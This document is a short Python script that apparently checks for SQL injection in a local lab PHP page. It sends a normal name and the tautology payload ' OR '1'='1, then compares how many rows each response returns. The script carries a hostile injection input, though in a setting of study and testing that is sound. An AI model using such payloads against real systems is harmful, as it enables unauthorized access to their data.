#!/usr/bin/env python3
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    with urllib.request.urlopen(url, timeout=5) as resp:
        return resp.read().decode("utf-8", "replace")

def main():
    try:
        normal = fetch("Alice")
        injected = fetch("' OR '1'='1")
    except Exception as e:
        print("REQUEST_FAILED:", repr(e))
        print("请检查：127.0.0.1:4280 是否启动、入口路径是否正确、db_connect.php 是否连接成功、lab_people 是否已初始化。")
        return

    print("NORMAL_BODY_START")
    print(normal)
    print("NORMAL_BODY_END")

    print("INJECT_BODY_START")
    print(injected)
    print("INJECT_BODY_END")

    for label, body in (("normal", normal), ("injected", injected)):
        print(
            label,
            "Alice=", "Alice" in body,
            "Bob=", "Bob" in body,
            "Carol=", "Carol" in body,
            "ID_count=", body.count("ID "),
        )

    normal_ok = ("Alice" in normal) and ("Bob" not in normal) and ("Carol" not in normal)
    injected_ok = all(x in injected for x in ("Alice", "Bob", "Carol"))

    if normal_ok and injected_ok:
        print("OBSERVED: 普通输入仅返回精确行；测试输入返回多行，符合 SQL 注入证据。")
    else:
        print("NOT_CONFIRMED: 请检查服务、连接、表数据、URL 和查询输出；不要仅凭 HTTP 200 判断成功。")

if __name__ == "__main__":
    main()
